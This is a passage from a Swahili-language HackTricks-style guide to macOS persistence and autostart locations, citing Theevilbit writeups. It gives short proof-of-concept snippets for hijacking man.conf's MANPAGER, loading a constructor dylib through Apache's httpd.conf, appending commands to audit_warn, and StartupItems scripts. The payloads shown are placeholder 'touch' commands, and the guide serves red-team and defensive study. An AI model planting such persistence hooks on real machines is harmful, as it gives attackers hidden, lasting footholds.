Na hapo **staff group inapaswa kuwa na sudo access** (soma `/etc/sudoers` ili kuthibitisha).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Muhimu kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na user lazima atumie man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/private/etc/man.conf`**
- Root inahitajika
- **`/private/etc/man.conf`**: Kila wakati man inatumiwa

#### Maelezo na Exploit

Config file **`/private/etc/man.conf`** huonyesha binary/script itakayotumiwa wakati wa kufungua man documentation files. Kwa hivyo, path ya executable inaweza kubadilishwa ili kila wakati user anapotumia man kusoma docs fulani, backdoor itekelezwe.<sup>[31]</sup>

Kwa mfano, weka katika **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Na kisha unda `/tmp/view` kama:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)

- Muhimu kwa bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na apache lazima iwe inaendesha
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd haina entitlements

#### Mahali

- **`/etc/apache2/httpd.conf`**
- Root inahitajika
- Kichocheo: Apache2 inapoanzishwa

#### Maelezo na Exploit

Unaweza kuonyesha kwenye `/etc/apache2/httpd.conf` kwamba module ipakwe kwa kuongeza mstari kama huu:<sup>[32]</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Kwa njia hii, **module** yako iliyocompile itapakiwa na Apache. Jambo pekee ni kwamba unahitaji ama **kui-sign kwa Apple certificate halali**, au **kuongeza certificate mpya inayoaminika** kwenye mfumo na **kui-sign** nayo.

Kisha, ikiwa inahitajika, ili kuhakikisha kuwa server itaanzishwa unaweza kutekeleza:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Mfano wa code wa Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Mfumo wa ukaguzi wa BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Ni muhimu kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root, auditd iwe inafanya kazi na isababishe warning
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/etc/security/audit_warn`**
- Root inahitajika
- **Kichochezi**: Wakati auditd inapotambua warning

#### Maelezo na Exploit

Kila wakati auditd inapotambua warning, script **`/etc/security/audit_warn`** **inatekelezwa**. Kwa hiyo unaweza kuongeza payload yako ndani yake.<sup>[33]</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Unaweza kulazimisha onyo kwa kutumia `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Hii imepitwa na wakati, kwa hivyo hakuna chochote kinachopaswa kupatikana kwenye saraka hizo.**

**StartupItem** ni saraka inayopaswa kuwekwa ndani ya `/Library/StartupItems/` au `/System/Library/StartupItems/`. Baada ya saraka hii kuundwa, lazima iwe na faili mbili mahususi:

1. **rc script**: Shell script inayotekelezwa wakati wa startup.
2. **plist file**, yenye jina maalum `StartupParameters.plist`, ambayo ina mipangilio mbalimbali ya configuration.

Hakikisha kwamba rc script na faili ya `StartupParameters.plist` zimewekwa kwa usahihi ndani ya saraka ya **StartupItem** ili startup process iweze kuzitambua na kuzitumia.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Siwezi kupata component hii kwenye macOS yangu, kwa hivyo angalia writeup kwa maelezo zaidi

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Iliyoanzishwa na Apple, **emond** ni utaratibu wa logging unaoonekana kuwa haujaendelezwa kikamilifu au huenda uliachwa, lakini bado unaweza kufikiwa. Ingawa si ya manufaa hasa kwa administrator wa Mac, service hii isiyojulikana sana inaweza kutumika kama persistence method fiche kwa threat actors, na huenda isibainike na admins wengi wa macOS.<sup>[34]</sup>

Kwa wale wanaojua kuwepo kwake, kutambua matumizi yoyote hasidi ya **emond** ni rahisi. LaunchDaemon ya mfumo kwa ajili ya service hii hutafuta scripts za kutekeleza kwenye directory moja. Ili kukagua hili, command ifuatayo inaweza kutumika:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Maelezo: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Mahali

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root inahitajika
- **Trigger**: Kwa kutumia XQuartz

#### Maelezo na Exploit

XQuartz **haisakinishwi tena kwenye macOS**, kwa hivyo ukitaka maelezo zaidi angalia writeup.<sup>[3]</sup>

### ~~kext~~

> [!CAUTION]
> Ni ngumu sana kusakinisha kext hata ukiwa Root kiasi kwamba sitazingatia hili kama njia ya kutoroka sandbox au hata kwa persistence (isipokuwa una exploit)

#### Mahali

Ili kusakinisha KEXT kama kipengee cha kuanzisha, inahitaji **kusakinishwa katika mojawapo ya maeneo yafuatayo**:

- `/System/Library/Extensions`
- Faili za KEXT zilizojengwa ndani ya mfumo wa uendeshaji wa OS X.
- `/Library/Extensions`
- Faili za KEXT zilizosakinishwa na software ya wahusika wengine

Unaweza kuorodhesha faili za kext zilizopakiwa kwa sasa kwa:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Kwa maelezo zaidi kuhusu [**kernel extensions angalia sehemu hii**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Mahali

- **`/usr/local/bin/amstoold`**
- Root inahitajika

#### Maelezo na Exploitation

Inaonekana `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilikuwa ikitumia binary hii huku ikifichua XPC service... jambo ni kwamba binary hiyo haikuwepo, kwa hivyo ungeweza kuweka kitu hapo na XPC service ilipoitwa, binary yako ingeitiwa.<sup>[35]</sup>

Siwezi tena kuipata kwenye macOS yangu.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Mahali

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root inahitajika
- **Trigger**: Wakati service inapoendeshwa (mara chache)

#### Maelezo na exploit

Inaonekana si jambo la kawaida sana kuendesha script hii, na hata sikuweza kuipata kwenye macOS yangu, kwa hivyo ikiwa unataka maelezo zaidi angalia writeup.<sup>[36]</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Hii haifanyi kazi katika matoleo ya kisasa ya MacOS**

Pia inawezekana kuweka hapa **commands zitakazoendeshwa wakati wa startup.** Mfano wa script ya kawaida ya rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Mbinu na zana za Persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Marejeleo

- [1] [2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Beyond the good ol' LaunchAgents - 1 - faili za shell startup](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Beyond the good ol' LaunchAgents - 18 - X11 na XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Beyond the good ol' LaunchAgents - 21 - Applications zilizofunguliwa tena](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Beyond the good ol' LaunchAgents - 20 - Mapendeleo ya Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Beyond the good ol' LaunchAgents - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Beyond the good ol' LaunchAgents - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Beyond the good ol' LaunchAgents - 22 - LoginHook na LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Beyond the good ol' LaunchAgents - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Beyond the good ol' LaunchAgents - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Beyond the good ol' LaunchAgents - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Beyond the good ol' LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Beyond the good ol' LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Beyond the good ol' LaunchAgents - 3 - Vipengee vya kuingia](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Beyond the good ol' LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Beyond the good ol' LaunchAgents - 24 - Vitendo vya Folda](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Vitendo vya Folda kwa Persistence kwenye macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Beyond the good ol' LaunchAgents - 27 - Njia za mkato za Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Beyond the good ol' LaunchAgents - 17 - Vichagua Rangi](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Beyond the good ol' LaunchAgents - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Kuchanganua Persistence ya "Mac File Opener" (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Beyond the good ol' LaunchAgents - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Kuhifadhi Ufikiaji Wako: Screensavers kwa Persistence ya macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Beyond the good ol' LaunchAgents - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Beyond the good ol' LaunchAgents - 9 - Pane ya Mapendeleo](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Beyond the good ol' LaunchAgents - 19 - Scripts za Mara kwa Mara](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Beyond the good ol' LaunchAgents - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Beyond the good ol' LaunchAgents - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Wizi Endelevu wa Credentials kwa kutumia Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Beyond the good ol' LaunchAgents - 30 - Faili ya usanidi wa man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Beyond the good ol' LaunchAgents - 25 - Moduli za Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Beyond the good ol' LaunchAgents - 31 - Mfumo wa ukaguzi wa BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Beyond the good ol' LaunchAgents - 23 - emond, Daemon ya Kufuatilia Matukio](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Beyond the good ol' LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Beyond the good ol' LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)

{{#include ../banners/hacktricks-training.md}}
